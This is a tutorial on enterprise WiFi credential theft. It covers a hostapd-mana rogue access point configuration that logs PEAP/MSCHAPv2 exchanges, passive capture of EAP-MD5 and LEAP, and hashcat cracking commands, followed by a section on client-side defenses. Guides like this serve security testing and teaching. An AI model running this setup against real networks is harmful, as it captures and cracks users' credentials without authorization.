# EAP credential capture and cracking

Enterprise WiFi (WPA2-Enterprise / WPA3-Enterprise) authenticates users through a RADIUS server using the Extensible Authentication Protocol (EAP). Unlike WPA-Personal, the password never touches the WPA handshake itself — it is exchanged inside an EAP method, usually wrapped in a TLS tunnel. Capturing the 4-way handshake from an enterprise network gives you nothing crackable. Instead, you capture the inner EAP credentials, either passively (if the EAP method has no encryption) or by running a rogue AP that terminates the TLS tunnel and exposes the inner exchange.

## What you need

- A Linux system with a WiFi adapter (monitor mode is helpful for passive capture but not required for rogue AP setups)
- **hostapd-mana** — rogue AP that terminates TLS and logs inner credentials (required for PEAP/MSCHAPv2)
- **hashcat** with GPU drivers — for offline cracking of captured hashes
- **hcxpcapngtool** — for extracting EAP-MD5 and LEAP hashes from passive captures
- A wordlist (e.g., `rockyou.txt` at `/usr/share/wordlists/rockyou.txt` on Kali)

## Which EAP methods are crackable

| EAP Method | Crackable | Capture Method | hashcat Mode | Notes |
|------------|-----------|----------------|--------------|-------|
| PEAP/MSCHAPv2 | Yes | Rogue AP (hostapd-mana) | `-m 5500` | Most common enterprise method. TLS tunnel must be terminated to expose MSCHAPv2. |
| EAP-MD5 | Yes | Passive capture | `-m 4800` | Challenge/response sent in cleartext, no tunnel. |
| Cisco LEAP | Yes | Passive capture | `-m 5500` | MS-CHAPv1 sent in cleartext. Deprecated by Cisco. |
| EAP-TLS | No | N/A | N/A | Certificate-based mutual authentication. No password transmitted. |
| EAP-TTLS/PAP | Capture only | Rogue AP | N/A | Password sent as plaintext inside TLS tunnel. No hash to crack — you get the password directly. |

## Step 1: PEAP/MSCHAPv2 -- rogue AP attack

This is the primary enterprise WiFi attack. PEAP wraps MSCHAPv2 inside a TLS tunnel. A rogue AP terminates the tunnel itself and captures the inner MSCHAPv2 challenge/response in cleartext.

### Set up hostapd-mana

Generate a self-signed certificate for the rogue AP:

```bash
openssl req -new -x509 -days 365 -nodes \
    -out /etc/hostapd-mana/certs/server.pem \
    -keyout /etc/hostapd-mana/certs/server.key \
    -subj "/CN=wifi.example.com/O=Example Corp/C=US"
```

Create the configuration file:

```ini
# /etc/hostapd-mana/hostapd-mana.conf
interface=wlan0
driver=nl80211
ssid=TargetNetworkName
channel=6
hw_mode=g

# WPA2-Enterprise
auth_algs=1
wpa=2
wpa_key_mgmt=WPA-EAP
wpa_pairwise=CCMP
ieee8021x=1

# EAP server
eap_server=1
eap_user_file=/etc/hostapd-mana/mana.eap_user
ca_cert=/etc/hostapd-mana/certs/ca.pem
server_cert=/etc/hostapd-mana/certs/server.pem
private_key=/etc/hostapd-mana/certs/server.key

# Credential capture
mana_wpe=1
mana_credout=/tmp/mana_creds.txt
```

Create the EAP user file:

```ini
# /etc/hostapd-mana/mana.eap_user
* PEAP,EAP-TTLS,LEAP
"t" MSCHAPV2 "t" [2]
```

Launch the rogue AP:

```bash
hostapd-mana /etc/hostapd-mana/hostapd-mana.conf
```

When a client connects and its supplicant does not validate the server certificate, hostapd-mana terminates the TLS tunnel, observes the MSCHAPv2 exchange, and writes the challenge/response to `/tmp/mana_creds.txt`. The client receives an EAP-Failure (the rogue AP does not know the password), but the credentials are already captured.

### Extract the hash

hostapd-mana logs credentials in the format:

```
MSCHAPV2: jdoe | aabbccddeeff0011 | f14c0699e0c6adac8c8d93c20e0a62db7834b1c8eb3ebe5f
```

Convert to hashcat mode 5500 format:

```
username::::NT-Response:challenge
```

Example:

```
jdoe::::f14c0699e0c6adac8c8d93c20e0a62db7834b1c8eb3ebe5f:aabbccddeeff0011
```

### Crack with hashcat

```bash
hashcat -m 5500 captured.hc5500 wordlist.txt
```

Mode 5500 is extremely fast because the underlying construction is DES-based with no key stretching. There is no PBKDF2 — modern GPUs achieve 10+ billion candidates per second. Short passwords and dictionary words fall in seconds. This is orders of magnitude faster than WPA-Personal cracking (mode 22000), which requires 4096 rounds of HMAC-SHA1 per guess.

For brute-force against an 8-character alphanumeric password:

```bash
hashcat -m 5500 captured.hc5500 -a 3 '?a?a?a?a?a?a?a?a'
```

## Step 2: EAP-MD5 -- passive capture

EAP-MD5 transmits its challenge/response in cleartext with no TLS tunnel. A passive capture in monitor mode is sufficient — no rogue AP required.

The client computes `MD5(Identifier || Password || Challenge)` and sends the result in the open. Both the challenge and response are visible in the capture.

### Extract the hash

```bash
hcxpcapngtool --eapmd5=eapmd5.hc4800 capture.pcapng
```

### Crack with hashcat

```bash
hashcat -m 4800 eapmd5.hc4800 wordlist.txt
```

Mode 4800 is raw MD5 with no key stretching. Billions of candidates per second on GPU. Any password under ~10 characters with a reasonable charset is crackable in seconds.

## Step 3: Cisco LEAP -- passive capture

LEAP is a Cisco-proprietary EAP method that uses MS-CHAPv1 challenge/response in cleartext (no TLS tunnel). Like EAP-MD5, passive capture is sufficient.

The AP sends an 8-byte challenge, the client responds with a 24-byte DES-encrypted NT hash. Both are visible in the capture.

### Extract the hash

```bash
hcxpcapngtool --eapleap=leap.hc5500 capture.pcapng
```

The `asleap` tool can also extract and crack LEAP hashes:

```bash
asleap -r capture.pcap -f wordlist.dict -n asleap.hash
```

### Crack with hashcat

```bash
hashcat -m 5500 leap.hc5500 wordlist.txt
```

LEAP uses the same hashcat mode as PEAP/MSCHAPv2 (mode 5500). Same DES-based construction, same GPU speed, same cracking approach. LEAP passwords are typically domain credentials, so a targeted dictionary attack against common corporate passwords is effective.

## Defense

The primary defense against rogue AP attacks is **server certificate validation on the client**. If the client's supplicant is configured to validate the RADIUS server's certificate (CA pinning + domain name check), it rejects the rogue AP's self-signed certificate at the TLS handshake and exposes nothing.

Enterprise networks should enforce:

- Server certificate validation enabled in the supplicant configuration
- CA certificate pinned to the organization's CA (not "trust any certificate")
- Domain name validation on the server certificate
- Disable legacy methods (EAP-MD5, LEAP) entirely — these have no TLS protection and are crackable from passive captures regardless of client configuration

For EAP-MD5 and LEAP, there is no defense other than migrating away from them. Both methods transmit credentials without encryption.

## Deep dive

For protocol details, hash format specifications, and tool configuration:

- [PEAP / MSCHAPv2 reference](../eap-attacks/peap-mschapv2.md) — MSCHAPv2 challenge/response structure, DES weakness, hash format details
- [EAP-MD5 reference](../eap-attacks/eap-md5.md) — MD5-Challenge packet structure (RFC 3748 S5.4), extraction methods
- [Cisco LEAP reference](../eap-attacks/leap.md) — LEAP authentication flow, MS-CHAPv1 construction, deprecation status
- [hostapd-mana reference](../tools/hostapd-mana.md) — full configuration reference, certificate generation, eaphammer alternative
- [hashcat reference](../tools/hashcat.md) — all WiFi-related modes, attack patterns, advanced usage
